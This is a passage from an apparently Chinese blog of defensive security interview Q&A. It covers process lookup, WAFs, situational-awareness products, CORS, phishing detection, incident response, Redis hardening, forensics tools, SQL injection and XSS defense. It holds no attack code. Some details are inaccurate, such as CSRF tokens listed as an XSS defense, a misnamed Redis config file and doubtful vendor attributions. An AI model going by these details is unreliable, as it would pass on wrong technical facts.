操作系统中，可以通过以下几种方法查看进程对应的程序位置：</p><ol><li>使用任务管理器：打开任务管理器，选择“详细信息”选项卡，右键单击需要查看程序位置的进程，选择“打开文件位置”。</li><li>使用资源监视器：在资源监视器中，选择“CPU”选项卡，找到需要查看程序位置的进程，在右侧面板中选择该进程并右键单击，选择“属性”菜单，即可查看程序位置。</li><li>使用命令行工具：打开命令提示符或者 PowerShell，输入以下命令：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">wmic process where &quot;processid=[进程 ID]&quot; get ExecutablePath</span><br></pre></td></tr></table></figure><p>其中，[进程 ID]是需要查看的进程的 PID（进程标识符）。</p><ol><li>使用第三方工具：许多第三方工具（如 Process Explorer）提供了更加详细的进程信息，并可以帮助用户快速定位程序位置。</li></ol><p>无论使用哪种方法，我们都可以在查找到程序位置后，根据需要采取相应的措施。例如，为了解决某些问题，我们可能需要删除、备份或更新程序文件；而在排查安全问题时，我们可能需要检查程序文件是否被篡改或者感染了病毒。</p><h2 id="WAF-产品有哪些分类，是如何拦截攻击的"><a href="#WAF-产品有哪些分类，是如何拦截攻击的" class="headerlink" title="WAF 产品有哪些分类，是如何拦截攻击的"></a>WAF 产品有哪些分类，是如何拦截攻击的</h2><p>WAF（Web 应用程序防火墙）产品通常可以分为以下几种分类：</p><ol><li>基于签名的 WAF：基于签名的 WAF 通过检测请求中是否包含已知漏洞的特征，来拦截攻击。这种类型的 WAF 可以快速识别和阻止已知的攻击方式。</li><li>基于行为的 WAF：基于行为的 WAF 使用机器学习、人工智能等技术来分析请求的行为模式，并判断其是否具有攻击性。这种类型的 WAF 能够较好地识别未知攻击。</li><li>综合型 WAF：综合型 WAF 结合了基于签名和基于行为两种技术，能够同时检测已知攻击和未知攻击，提供更加全面的保护。</li></ol><p>WAF 产品一般通过拦截攻击请求来保护 Web 应用程序。具体的拦截方式包括：</p><ol><li>黑名单过滤：根据已知的攻击方式，设置黑名单规则，对符合规则的请求进行拦截。</li><li>白名单过滤：对请求进行白名单过滤，只允许符合规则的请求通过。</li><li>存储过程注入防护：对 SQL 注入进行防护。WAF 可以检测并拦截具有攻击意图的 SQL 语句，并对其进行相应的修复和防护。</li><li>跨站脚本（XSS）防护：WAF 可以检测并过滤包含恶意 JavaScript 代码的请求，并防止 XSS 攻击。</li><li>防止文件上传漏洞：WAF 可以检测并拦截包含恶意文件的请求，从而避免文件上传漏洞导致的攻击。</li></ol><p>总之，WAF 产品可以有效地保护 Web 应用程序免受各种类型的攻击。但是需要注意的是，WAF 并不是万能的，仍然需要结合其他安全措施来保障 Web 应用程序的安全。</p><h2 id="你有用过态势感知的产品吗？"><a href="#你有用过态势感知的产品吗？" class="headerlink" title="你有用过态势感知的产品吗？"></a>你有用过态势感知的产品吗？</h2><ol><li>360态势感知：由中国著名安全厂商360推出的产品，主要提供网络威胁查询、漏洞扫描、流量分析等功能，同时集成了各种安全情报和指标，可以为用户提供全面的安全态势分析和预警服务。</li><li>腾讯云安全大脑：由腾讯云推出的产品，利用 AI、机器学习等技术对攻击进行实时监测和分析，提供包括漏洞扫描、风险评估、异常检测等一系列安全服务。</li><li>云锁事件响应中心：由阿里云推出的产品，提供网络空间威胁和安全事件的监测、预警、应急响应等服务。该产品采用 AI 算法进行态势感知，并可以自动化响应安全事故。</li><li>北京赛迪态势感知系统：由北京赛迪安全科技股份有限公司开发的产品，支持网络威胁情报搜集、风险事件自动识别、威胁行为关联分析等功能，可为企业提供全生命周期的网络安全保护。</li><li>启明星辰安全态势感知：由启明星辰推出的产品，提供整体安全态势感知、针对性攻击检测、应急响应等功能，可帮助用户实现从被动防御到主动防御的转变。</li></ol><p>这些产品都采用了先进的机器学习和人工智能技术，可以自动化地分析和识别网络威胁，并及时发出预警或者采取应急措施。同时，这些产品还具备可视化的操作界面，用户可以通过简单的操作就可以了解整个系统的安全情况，并做出相应的决策。</p><h2 id="什么是跨域，JSONP-与-CORS"><a href="#什么是跨域，JSONP-与-CORS" class="headerlink" title="什么是跨域，JSONP 与 CORS"></a>什么是跨域，JSONP 与 CORS</h2><p>在 Web 开发中，跨域（Cross-Origin）指的是当一个 web 应用程序在访问另一个与其来源（协议、域名或端口号）不同的 web 应用程序时所发生的浏览器安全限制。这种限制可以防止非法的数据窃取和恶意代码的注入，从而保障了用户的信息安全。</p><p>为了解决跨域问题，Web 安全领域出现了两种常见的技术：JSONP 和 CORS。</p><ol><li>JSONP：JSONP（JSON with Padding）是一种跨域请求数据的方式，原理是通过在 HTML 页面上使用 script 标签加载远程 JSON 数据，并通过回调函数处理获取到的数据。这种方式可以绕过浏览器的同源策略，但只支持 GET 请求。</li><li>CORS：CORS（Cross-Origin Resource Sharing）是在服务器端设置允许跨域请求的机制。它通过在 HTTP 头信息中添加一些字段来告诉浏览器该服务器允许哪些域名的请求。CORS 可以支持各种类型的 HTTP 请求，并且比 JSONP 更加灵活和安全。</li></ol><p>总之，无论是 JSONP 还是 CORS，都是为了解决跨域问题而设计的技术。开发人员可以根据自己的需求来选择适合自己的方式，并结合安全考虑进行使用。同时，为了保护用户的信息安全，在使用跨域技术时，需要特别注意对传输数据的加密和防篡改措施。</p><h2 id="如何发现钓鱼邮件"><a href="#如何发现钓鱼邮件" class="headerlink" title="如何发现钓鱼邮件"></a>如何发现钓鱼邮件</h2><p>钓鱼邮件是一种常见的网络针对性攻击手段，通常通过电子邮件发送虚假信息诱骗受害者提供个人敏感信息或进行非法行为。以下是几种发现钓鱼邮件的方法：</p><ol><li>查看发件人地址：钓鱼邮件的发件人地址通常会伪装成合法、可信的机构或公司，但是如果您仔细查看发件人地址，就可能发现其不是该机构或公司真正的域名。</li><li>检查链接地址：钓鱼邮件中通常会包含可疑的链接，如果您将鼠标悬停在链接上，就可以看到链接的真实地址。如果该地址与邮件内容不符，就可能是钓鱼邮件。</li><li>注意邮件内容：钓鱼邮件通常会给人留下一种紧急、必须立即采取行动的感觉，从而诱骗用户点击链接或执行某些操作。因此，如果您收到这样的邮件，请仔细阅读邮件内容，并多加思考和确认。</li><li>尽量避免下载附件：钓鱼邮件通常会携带恶意附件，如果您无法确认邮件的真实性，最好不要下载或打开这些附件，以免被感染。</li><li>安装反钓鱼软件：有一些反钓鱼软件可以帮助用户检测和拦截钓鱼邮件，例如 Google 的 Password Alert 等。</li></ol><p>总之，发现钓鱼邮件需要多加警惕和注意，在收到可疑邮件时，应该仔细查看邮件内容和相关信息，并尽可能采取措施避免被钓鱼攻击。</p><h2 id="如何查看区分是扫描流量和手动流量"><a href="#如何查看区分是扫描流量和手动流量" class="headerlink" title="如何查看区分是扫描流量和手动流量"></a>如何查看区分是扫描流量和手动流量</h2><p>扫描流量和手动流量的区别在于其产生的方式和行为特征，因此可以通过以下几种方法来查看区分它们：</p><ol><li>查看流量来源：扫描流量通常是由自动化工具或蠕虫病毒等程序生成的，因此其源 IP 或者发起请求的主机通常不固定，而手动流量则来自人工操作的设备，其请求的 IP 地址和用户代理信息都会有所不同。</li><li>检测流量频率和规律：扫描流量通常会呈现出周期性、规律性的访问行为，例如连续大量的 TCP SYN 请求等。而手动流量则通常难以呈现出明显的规律和周期性。</li><li>观察流量的请求路径和参数：扫描流量通常是为了探测系统漏洞和弱点而产生的，它们通常会对一些已知的 URL 和参数进行大量的尝试，并使用一些特殊的 HTTP 头部信息。而手动流量则更加多样化，可能会包含更丰富的请求路径和参数。</li><li>分析流量的响应状态码和长度：扫描流量通常会通过检测返回的状态码和页面长度等信息来判断目标是否存在漏洞或弱点。手动流量则通常会具有更加正常的响应状态码和页面长度。</li></ol><p>总之，通过综合分析流量来源、访问规律、请求路径和参数以及响应状态码等特征，我们可以比较准确地区分扫描流量和手动流量，并采取相应的防御措施。</p><h2 id="遇到-exe-文件如何处理？"><a href="#遇到-exe-文件如何处理？" class="headerlink" title="遇到.exe 文件如何处理？"></a>遇到.exe 文件如何处理？</h2><p>.exe 文件是 Windows 上的可执行文件，通常包含应用程序或者安装程序等内容。如果您在电子邮件或者网络上收到了 .exe 文件，需要格外小心，因为它们可能包含病毒、恶意软件或者其他危险物品。以下是几种处理方法：</p><ol><li>不要直接运行：不要轻易双击或者打开未知来源的 .exe 文件，因为它们可能会启动恶意软件，并对您的系统造成损害。如果您必须要运行这些 .exe 文件，请先进行杀毒软件扫描和检测操作。</li><li>使用虚拟机：如果您需要测试某个 .exe 文件的行为和效果，可以考虑使用虚拟机。虚拟机可以将一个完整的操作系统运行在一个软件容器中，使得用户可以在其中安全地运行可疑的 .exe 文件，并且不会影响主机系统的安全性。</li><li>上传到在线扫描服务平台：一些在线杀毒软件平台，例如 VirusTotal 等，提供了在线扫描可疑文件的服务。如果您不确定一个 .exe 文件是否安全，可以上传到这些平台进行扫描，以获取更多的信息和建议。</li><li>将文件发送给安全专家：如果您无法确定 .exe 文件的安全性，可以将其发送给安全专家进行分析。安全专家可以根据其行为特征和结构等信息，对该文件进行深度分析，以确定是否存在潜在的安全威胁。</li></ol><p>总之，在处理未知来源的 .exe 文件时，需要注意谨慎并采取必要的安全措施，以确保您的系统不会被攻击或感染。如果您遇到可疑的 .exe 文件，请务必进行杀毒软件扫描，并尽可能获取更多的信息和建议。</p><h2 id="应急响应的排查思路？"><a href="#应急响应的排查思路？" class="headerlink" title="应急响应的排查思路？"></a>应急响应的排查思路？</h2><p>应急响应的排查思路主要包括以下几个方面：</p><ol><li>确认事件：首先需要了解事件的具体情况，包括发生的时间、影响范围、受影响的系统和服务等信息。同时还需要判断是否存在钓鱼邮件、病毒感染等情况，以确定是否存在网络安全事件。</li><li>收集证据：在确认安全事件后，需要及时收集相关证据，包括日志记录、网络流量、进程信息、文件系统状态等信息，并进行存档备份。这些证据可以为后续的分析提供依据。</li><li>分析数据：对收集到的证据进行分析，尤其是日志和网络流量等数据，可以帮助快速定位问题和确认是否存在攻击行为。在分析过程中，可以利用一些常见的工具，例如 Wireshark、Nmap、Sysinternals 等。</li><li>阻止攻击：在确认存在攻击行为后，需要立即采取措施，阻止攻击并保护现有系统。这些措施包括封锁网络、隔离受感染主机、关闭漏洞等。</li><li>制定应急计划：根据分析结果，制定相应的应急计划，确保系统能够迅速恢复正常的运行状态。应急计划应该包括恢复数据、修复漏洞、加强安全防御等方面。</li></ol><p>总之，应急响应排查思路需要遵循快速响应、收集证据、分析数据、阻止攻击和制定应急计划等原则，并且需要依靠专业的技能和工具来实现。在实际操作中，需要小心谨慎，同时保持高度警惕和敏锐性。</p><h2 id="普通的加固手段？"><a href="#普通的加固手段？" class="headerlink" title="普通的加固手段？"></a>普通的加固手段？</h2><p>普通的加固手段包括以下几种：</p><ol><li>更新补丁：定期更新操作系统、应用程序的补丁，修复已知的漏洞和安全问题。</li><li>强化口令策略：采用复杂、难以猜测的密码，并进行定期更换。同时可以启用账户锁定、多次失败尝试限制等功能，提高口令安全性。</li><li>加强身份验证：采用多因素身份验证技术，例如使用硬件令牌、生物特征等方式，确保只有授权用户才能访问系统。</li><li>安装防病毒软件：安装并及时更新防病毒软件，定期进行全盘扫描和实时监控，以便及时发现和处置潜在的恶意软件。</li><li>关闭不必要服务：关闭系统中不必要的服务和端口，降低攻击面，避免被利用。</li><li>限制访问权限：根据业务需要，设置合理的访问权限，对于未授权的用户或者设备进行限制，提高系统的安全性。</li><li>数据备份与恢复：定期备份重要数据，并将其存储在安全可靠的位置。在出现故障或事件时，能够快速恢复数据，避免数据丢失和系统停机。</li></ol><p>总之，以上这些普通的加固手段可以帮助提高系统的安全性和稳定性，并且也是网络安全基础建设的关键步骤。在实际操作中，需要根据具体情况和需求，结合其他安全措施来进行综合加固。同时需要注意及时更新和检查，以确保系统始终处于安全状态。</p><h2 id="redis未授权的条件，修复方式？"><a href="#redis未授权的条件，修复方式？" class="headerlink" title="redis未授权的条件，修复方式？"></a>redis未授权的条件，修复方式？</h2><p>Redis 未授权访问是指某些 Redis 实例的访问控制没有得到正确配置，导致攻击者可以通过不需要认证的方式直接连接该实例并进行操作。这可能会导致敏感数据泄露、系统被攻击等安全问题。</p><p>修复 Redis 未授权访问的方式包括以下几个步骤：</p><ol><li>确认是否存在未授权访问：通过检查日志和网络流量等信息，确认是否存在未授权访问的情况。</li><li>修改 Redis 配置文件：在 redis.config 配置文件中，找到 bind 参数并将其设置为 Redis 监听的 IP 地址。此外，还需要设置 requirepass 参数，并设置一个强密码来保护 Redis 数据库。</li><li>重新启动 Redis 服务：在修改完 Redis 配置文件后，需要重新启动 Redis 服务，以便使新的配置生效。</li><li>禁用 Redis 远程访问：如果您的 Redis 服务只在本地使用，则应禁用 Redis 的远程访问，以降低攻击面和提高安全性。</li><li>定期更新 Redis 和操作系统补丁：及时更新 Redis 和操作系统的安全补丁，以修复已知漏洞和提高系统安全性。</li></ol><p>总之，在修复 Redis 未授权访问时，我们需要先确认是否存在未授权访问的情况，然后按照上述步骤进行修复。为了保证系统安全，我们还需要经常检查 Redis 配置文件和操作系统状态，及时更新补丁，并定期进行安全审计和漏洞扫描等操作。</p><h2 id="被攻击后，日志文件以及木马文件被删除怎样排查"><a href="#被攻击后，日志文件以及木马文件被删除怎样排查" class="headerlink" title="被攻击后，日志文件以及木马文件被删除怎样排查"></a>被攻击后，日志文件以及木马文件被删除怎样排查</h2><p>被攻击后，日志文件和木马文件被删除会给排查工作带来很大的困难，但还是有一些方法可以尝试：</p><ol><li>查看系统备份：如果您的系统进行了定期备份，那么可以尝试从备份中恢复丢失的日志文件和木马文件。如果备份没有受到攻击，那么这种方式可能会非常有效。</li><li>恢复已删除文件：一些数据恢复软件，例如Recuva、EaseUS Data Recovery等，可以恢复已删除的文件。您可以尝试使用这些软件来恢复被删除的文件。</li><li>检查其他主机：如果您的系统被集成到网络中，可以检查其他主机是否有相同的攻击迹象和后门程序。对于攻击者来说，攻击多台主机通常需要更多的时间和资源，因此在其他主机上发现类似的攻击行为也许能够提供有用的信息。</li><li>分析系统快照：如果您的系统支持系统快照功能，例如 Windows 系统还原点，可以尝试回滚系统至之前的快照状态，并分析该状态下的日志信息和系统状态，以寻找攻击行为的证据。</li><li>日志审计：如果日志文件被删除，可以尝试通过其他渠道收集日志信息，并进行审计分析。例如，可以检查网络流量、系统性能、系统进程等信息，以确定是否存在异常行为。</li></ol><p>总之，在日志文件和木马文件被删除的情况下，需要采用其他方法来寻找攻击迹象和证据。同时，为了避免这种情况的发生，我们应该在系统中设置必要的日志轮转和备份策略，并加强安全防御工作，避免被攻击者入侵。</p><h2 id="安全设备报警"><a href="#安全设备报警" class="headerlink" title="安全设备报警"></a>安全设备报警</h2><p>安全设备报警是指安全设备（例如入侵检测系统、防火墙、安全加固等）监测到的与安全相关的事件或活动达到了预先设定的规则和阈值，触发了警报通知。以下是一些处理安全设备报警的方法：</p><ol><li>确认警告的真实性：首先需要确认收到的警报信息是否为真实的安全事件，需要对日志和其他相关信息进行分析和验证。如果发现确实存在安全问题，则需要立即采取适当措施。</li><li>优先级分类：不同类型的安全事件具有不同的严重程度和威胁级别，需要根据事件的类型、来源等因素进行分类和优先级排序，并采取相应的措施进行处理。</li><li>制定处理计划：根据事件情况和优先级，制定相应的处理计划和操作流程。这些计划可以包括隔离受感染主机、采取补救措施、收集证据等方面。</li><li>跟踪事件进展：在处理安全事件时，需要跟踪事件的进展和结果，并及时更新相关记录和文档。同时要保持与相关人员的沟通和协调，以便及时解决问题。</li><li>定期复查：定期审查和分析系统和设备的报警记录和日志，以及采取的应对措施和效果。这可以帮助发现系统中存在的风险和漏洞，并及时加以修复和优化。</li></ol><p>总之，在处理安全设备报警时，需要快速响应、分类优先、制定计划等步骤，以保障系统的安全性，并且需要持续地监测和优化安全防御策略。</p><h2 id="日志与流量分析"><a href="#日志与流量分析" class="headerlink" title="日志与流量分析"></a>日志与流量分析</h2><p>日志和流量分析是网络安全领域中常用的两种技术。它们都可以帮助安全人员更好地了解系统的状态，检测和预防威胁。</p><p>日志分析是指对服务器、应用程序等产生的日志进行收集、存储、分析和处理，以便了解系统的运行状况和发现异常事件。通过对日志数据的统计和分析，可以追踪用户活动、系统错误、安全事件等，以及发现潜在的风险和漏洞。比如，通过分析登录日志可以检测到恶意登录尝试；通过分析访问日志可以了解网站的被攻击情况。</p><p>流量分析是指对网络流量进行收集、存储、分析和处理，以便了解网络连接的状态，检测和预防网络攻击。通过对流量数据的统计和分析，可以追踪网络通信、检测威胁和漏洞，比如检测恶意流量、DDoS攻击等。流量分析通常需要使用专业的工具和技术，包括网络协议分析、流量捕获和分析软件等。</p><p>综上所述，日志和流量分析是网络安全中非常重要的技术，它们可以帮助安全人员发现和解决潜在的安全问题，并维护系统和网络的正常运行。</p><h2 id="服务器资源异常"><a href="#服务器资源异常" class="headerlink" title="服务器资源异常"></a>服务器资源异常</h2><ol><li>检查服务器负载情况：使用系统监视工具（如top、htop或glances等）来检查服务器的负载状况。如果负载过高，请考虑升级服务器资源或调整应用程序配置。</li><li>清理硬盘空间：如果硬盘空间不足，可以删除不必要的文件和日志，或者将它们移到其他存储设备上。</li><li>优化数据库：如果您的应用程序使用了数据库，可以尝试优化数据库以提高性能和减少资源使用。</li><li>减少并发连接数：如果您的应用程序支持并发连接，可以考虑限制同时连接的数量，从而减轻服务器压力。</li><li>升级服务器硬件：如果您的服务器硬件过时，升级服务器硬件可能是一个好选择。</li></ol><p>这里列出的是一些常见的解决方法，但具体应该根据您的问题和实际情况进行分析和处理。</p><h2 id="邮件钓鱼"><a href="#邮件钓鱼" class="headerlink" title="邮件钓鱼"></a>邮件钓鱼</h2><p>邮件钓鱼是一种利用欺骗手段获取用户敏感信息（如用户名和密码）的网络攻击。以下是一些防范邮件钓鱼的措施：</p><ol><li>仔细检查发件人和链接：在打开或回复任何邮件之前，请确保发件人地址是正确的，并且不要点击任何可疑的链接。</li><li>不要泄露敏感信息：请不要在电子邮件中提供敏感信息，例如您的用户名、密码或银行卡号码等。</li><li>使用邮件过滤器：许多电子邮件服务提供商都有垃圾邮件和恶意软件过滤器，可以帮助防止钓鱼邮件进入您的收件箱。</li><li>使用双因素身份验证：如果可能的话，请使用双因素身份验证来增强账户安全性。</li><li>教育员工：对于企业来说，教育员工如何识别和应对钓鱼邮件至关重要，这将有助于减少安全风险。</li></ol><p>总之，防范邮件钓鱼需要我们保持警惕，小心处理邮件，避免泄露敏感信息，使用合适的安全工具，加强安全意识培训。</p><h2 id="蜜罐系统"><a href="#蜜罐系统" class="headerlink" title="蜜罐系统"></a>蜜罐系统</h2><p>蜜罐系统是一种安全防御技术，它通过模拟真实系统和应用程序环境来诱导攻击者进行攻击，以便收集攻击者的行为信息并保护真实系统免受攻击。</p><p>蜜罐系统通常包括以下组件：</p><ol><li>虚拟机：虚拟机用于运行蜜罐操作系统和应用程序，并提供与真实系统类似的环境。</li><li>模拟应用程序：模拟应用程序模拟真实应用程序的功能，但同时也被设计成易受攻击的。</li><li>监听器：监听器负责记录攻击者的所有行为，例如攻击方式、攻击目标、攻击时间等。</li><li>分析器：分析器负责对监听器收集到的数据进行分析，并生成相关的报告。</li></ol><p>使用蜜罐系统可以帮助安全团队更好地了解攻击者的行为和策略。此外，当攻击发生时，蜜罐系统还可以吸引攻击者并分散他们的注意力，从而降低真实系统遭受攻击的风险。</p><p>但需要注意的是，使用蜜罐系统也存在一些风险，如攻击者可能会利用蜜罐系统来了解防御策略和安全漏洞，因此在使用蜜罐系统时需要谨慎评估其风险和收益。</p><h2 id="溯源反制手段"><a href="#溯源反制手段" class="headerlink" title="溯源反制手段"></a>溯源反制手段</h2><p>溯源反制手段是指在网络攻击发生后，对攻击来源进行追踪和分析，以便采取相应的反制措施。以下是一些常见的溯源反制手段：</p><ol><li>IP地址追踪：通过IP地址追踪可以确定攻击者的地理位置和ISP信息等，并且可以将这些信息提供给执法机构进行调查和追诉。</li><li>系统日志分析：系统日志记录了系统的所有活动信息，包括用户登录、访问权限、进程启动等。通过对系统日志的分析，可以了解攻击的时间、方式和攻击者可能留下的痕迹。</li><li>恶意软件分析：恶意软件通常会留下特定的标志或指令，这些标志或指令可以帮助分析人员了解攻击者的目的和策略。通过分析恶意软件，还可以发现其它潜在的安全威胁。</li><li>威胁情报分析：威胁情报分析可以帮助判断攻击者的目的和策略，并可以收集针对特定攻击的信息和反制策略。</li><li>电子邮件头分析：邮件头中包含了一些关于发送方和接收方的信息，例如IP地址、电子邮件客户端类型等。通过分析邮件头，可以确定攻击者的来源和行踪。</li></ol><p>总之，在进行溯源反制时，需要综合运用多种手段，从多个角度收集信息，并对这些信息进行深入分析，以便更好地了解攻击的情况，采取相应的反制措施。</p><h2 id="通过wireshark工具如何对流量进行溯源？"><a href="#通过wireshark工具如何对流量进行溯源？" class="headerlink" title="通过wireshark工具如何对流量进行溯源？"></a>通过wireshark工具如何对流量进行溯源？</h2><p>Wireshark是一个网络抓包工具，可以捕获和分析网络流量。以下是使用Wireshark工具对流量进行溯源的步骤：</p><ol><li>打开Wireshark软件并开始捕获网络流量。</li><li>过滤出需要关注的数据包。例如，如果要寻找某个IP地址的流量，可以在Wireshark中使用过滤器“ip.addr == [目标IP地址]”来过滤出相关数据包。</li><li>找到涉及目标IP地址的数据包，并分析它们。可以查看数据包的详细信息，例如源IP地址、目标IP地址、端口号、协议类型等，以获取更多有关攻击者的信息。</li><li>根据数据包的来源IP地址和端口号，确定攻击者可能所在的网络或主机。可以通过WHOIS查询来了解更多信息，例如注册人姓名、电子邮件地址、电话号码等。</li><li>对数据包进行深入分析，以判断是否存在恶意活动。例如，检查数据包中传输的文件是否被感染，或者检查是否存在异常流量或频繁的连接尝试等。</li></ol><p>总之，通过Wireshark工具对流量进行溯源需要我们认真观察和分析数据包，尤其需要关注目标IP地址和涉及该地址的数据包，从多个角度收集信息，以便更好地了解攻击的情况，并采取相应的反制措施。</p><h2 id="如何定位到攻击-IP"><a href="#如何定位到攻击-IP" class="headerlink" title="如何定位到攻击 IP"></a>如何定位到攻击 IP</h2><p>为了定位到攻击IP，您可以跟随以下步骤：</p><ol><li>收集攻击事件的日志信息：首先，您需要获取与攻击相关的日志信息。这可能包括服务器、网关或IDS/IPS设备等的日志文件。检查这些日志文件以查看攻击事件的详细信息。</li><li>确定攻击类型：根据攻击日志信息，确定攻击类型，例如DDoS攻击、SQL注入等。</li><li>使用网络嗅探工具：您可以使用像Wireshark这样的网络嗅探工具来捕获和分析网络流量。通过分析数据包，您可以确定攻击流量的来源IP地址。</li><li>分析网络流量：对分析出的流量进行深入分析，查找异常流量特征。例如，您可以检查是否有大量流量来自同一IP地址或者是否有许多连接尝试来自相同的IP地址。</li><li>使用WHOIS查询：使用WHOIS查询可以帮助您查找IP地址归属地和注册人信息，以便更好地了解攻击者的位置和身份。</li><li>采取反制措施：最后，根据收集到的信息，确定攻击者的IP地址，并采取相应的反制措施，例如在防火墙中添加黑名单规则或使用安全设备来抵御攻击。</li></ol><p>需要注意的是，攻击者可能会使用虚假或伪造的IP地址来掩盖自己的身份和位置。在这种情况下，您可能需要使用其他技术手段来确定攻击者的真实来源。</p><h2 id="常用取证工具有哪些"><a href="#常用取证工具有哪些" class="headerlink" title="常用取证工具有哪些"></a>常用取证工具有哪些</h2><p>常用的取证工具包括：</p><ol><li>FTK（Forensic Toolkit）：一款全面的数字取证工具，可以获取、分析和报告各种数字数据。</li><li>EnCase：一款商业化的取证工具，广泛应用于执法机构和企业中。</li><li>X-Ways Forensics：一款功能强大的取证工具，可以解析多种文件系统和磁盘映像格式。</li><li>Autopsy：一个免费的开源取证工具，可以帮助用户快速识别证据并生成相应的报告。</li><li>Volatility Framework：一个基于内存取证的工具，可以提取运行中操作系统的进程、内核模块和网络连接等信息。</li><li>Wireshark：一款流量分析工具，可以捕获和分析网络数据包，并对其进行深入的分析。</li><li>Forensic Browser for SQLite：一款专门用于SQLite数据库的取证工具，可以查看、搜索和导出SQLite数据库中的数据。</li></ol><p>这些工具都有各自的优缺点和适用场景，根据实际需求选择合适的工具很重要。</p><h2 id="溯源的常见手法？"><a href="#溯源的常见手法？" class="headerlink" title="溯源的常见手法？"></a>溯源的常见手法？</h2><p>数字溯源是指通过分析数字证据，追踪和还原事件或活动的发生过程和轨迹。常见的溯源手法包括：</p><ol><li>网络日志溯源：根据网络日志记录来追踪网络活动的来源、目的地和传输路径。</li><li>数据库溯源：通过对数据库中数据修改、删除和查询等操作的记录，还原出相关事件的发生过程。</li><li>软件代码溯源：通过对软件代码进行逆向分析，确定软件的功能、用途和开发者信息。</li><li>文件元数据溯源：通过分析文件元数据（如文件创建时间、修改时间和所有者信息等），确定文件的来源和修改历史。</li><li>实体设备溯源：通过物理取证、数据提取和分析，还原数字设备被使用的历史记录和活动轨迹。</li></ol><p>综合运用这些溯源手法，可以有效地追踪和还原数字活动的整个过程，为刑事侦查、安全审计和企业风险管理等领域提供重要支持。但值得注意的是，数字溯源需要遵守严格的法律程序和规范，并尊重用户的隐私权和数据保护要求。</p><h2 id="如何封ip"><a href="#如何封ip" class="headerlink" title="如何封ip"></a>如何封ip</h2><p>封禁IP是指通过防火墙或其他网络安全设备，阻止某个IP地址对网络资源进行访问。封禁IP可以有效地防止恶意攻击、网络滥用和非法访问等问题，保护网络安全。</p><p>以下是封禁IP的一般步骤：</p><ol><li>登录防火墙或其他网络安全设备，进入配置界面。</li><li>找到IP过滤规则或黑名单功能，添加封禁规则。</li><li>在规则中填写要封禁的IP地址或IP地址段。</li><li>设置封禁的时间或持续期限（如永久封禁或暂时封禁）。</li><li>保存设置并生效，检查是否成功封禁目标IP。</li></ol><p>需要注意的是，在封禁IP之前，应该确认被封禁的IP确实存在安全问题，并遵守相应的法律和政策规定，以免误伤合法用户和引发纠纷。同时，应该及时监控封禁效果，并在必要的情况下进行调整和解除封禁。</p><h2 id="sql注入产生的原因是什么"><a href="#sql注入产生的原因是什么" class="headerlink" title="sql注入产生的原因是什么"></a>sql注入产生的原因是什么</h2><p>SQL注入是一种攻击技术，它利用应用程序没有正确过滤或转义用户输入的数据，导致恶意用户可以向应用程序的后台数据库中插入恶意代码。这通常是因为应用程序没有有效地验证和处理用户输入数据，从而允许攻击者在输入框中输入特定的字符或语句，以绕过应用程序的安全性措施。</p><p>例如，如果一个应用程序允许用户在登录时输入用户名和密码，但没有正确地过滤输入的数据，那么攻击者可以尝试在用户名或密码字段中输入SQL查询的一部分，从而绕过身份验证，甚至执行任意的数据库操作。</p><p>因此，要防止SQL注入攻击，应用程序需要对所有用户输入进行严格的验证和处理，以确保任何输入的数据都被正确地过滤、转义或编码，从而避免可能导致注入攻击的特殊字符或语句被传递到数据库服务器。</p><h2 id="sql注入怎么修复"><a href="#sql注入怎么修复" class="headerlink" title="sql注入怎么修复"></a>sql注入怎么修复</h2><p>修复SQL注入漏洞的主要方法之一是使用参数化查询。这种技术可以将用户输入作为参数传递给数据库查询，而不是将其拼接到查询字符串中。通过这种方式，应用程序可以避免恶意用户在输入中注入任何SQL代码。</p><p>另一个修复SQL注入漏洞的方法是对输入数据进行严格的验证和过滤。这需要开发人员仔细检查所有用户输入数据，并确保它们只包含有效的字符和格式。例如，如果一个输入字段只接受数字，则必须验证输入是否仅包含数字，并拒绝包含其他字符的输入。</p><p>最后，还可以使用安全的编程实践来保护应用程序免受SQL注入攻击。这包括限制应用程序的权限以及使用加密和身份验证等安全措施来保护数据库服务器和应用程序。</p><p>总之，修复SQL注入漏洞的关键是开发人员需要了解并理解如何处理用户输入，并采取必要的措施来确保输入数据的完整性和安全性。</p><h2 id="xss是什么"><a href="#xss是什么" class="headerlink" title="xss是什么"></a>xss是什么</h2><p>XSS（Cross-site scripting）是一种攻击技术，也是Web应用程序中最常见的漏洞之一。它利用了应用程序没有正确过滤或转义用户输入的数据，导致恶意用户可以向网站上注入恶意脚本代码，使其他用户在浏览网站时受到攻击。</p><p>XSS攻击通常发生在包含表单、搜索框和评论框等用户输入区域的Web页面上。攻击者会向这些输入框中插入包含恶意脚本代码的数据，以便当其他用户在访问该页面时执行这些恶意代码，从而实现攻击目的。</p><p>例如，如果一个在线购物网站没有对用户在评论框中输入的HTML代码进行过滤，那么攻击者可以通过在评论框中注入恶意JavaScript代码来窃取其他用户的登录凭证或个人信息。</p><p>因此，要防止XSS攻击，开发人员需要对所有用户输入进行严格的验证和处理，并对任何输入的数据进行必要的过滤和转义，以确保所有输入的数据都不能被解释为恶意脚本。此外，还可以使用安全的编程实践和安全框架来保护网站免受XSS攻击的危害。</p><h2 id="xss攻击如何防御"><a href="#xss攻击如何防御" class="headerlink" title="xss攻击如何防御"></a>xss攻击如何防御</h2><p>为了防止XSS攻击，开发人员可以采用以下措施：</p><ol><li>输入过滤和验证：对于用户输入的数据进行严格的过滤和验证，只允许输入必要的字符和格式，并拒绝不受支持的HTML、CSS或JavaScript代码。</li><li>输出编码和转义：在将任何用户输入输出到Web页面上之前，请确保对其进行编码和转义，以确保它们不会被解释为恶意脚本。例如，在输出HTML时，可以使用HTML实体编码将特殊字符（如&lt;、&gt;、&amp;）转换为等效的字符实体。这样可以避免浏览器将它们解释为HTML标签或JavaScript代码。</li><li>使用安全框架和库：许多Web应用程序框架和安全库提供了内置的XSS防御机制，例如跨站点请求伪造（CSRF）令牌和自动输出编码。使用这些框架和库可以大大减少XSS攻击的风险。</li><li>学习安全编程实践：开发人员应该学习并遵循安全编程实践，例如安全的HTTP头设置、HTTPS使用、安全的Cookie管理等。</li><li>定期漏洞扫描和修复：定期运行漏洞扫描工具来检测网站中的潜在XSS漏洞，并及时修复这些漏洞，以避免遭受攻击。</li><li>加强用户教育：通过向用户提供安全意识培训和提示，可以帮助他们了解如何保护自己不受XSS攻击的危害，例如不点击垃圾邮件中的链接，不下载未经验证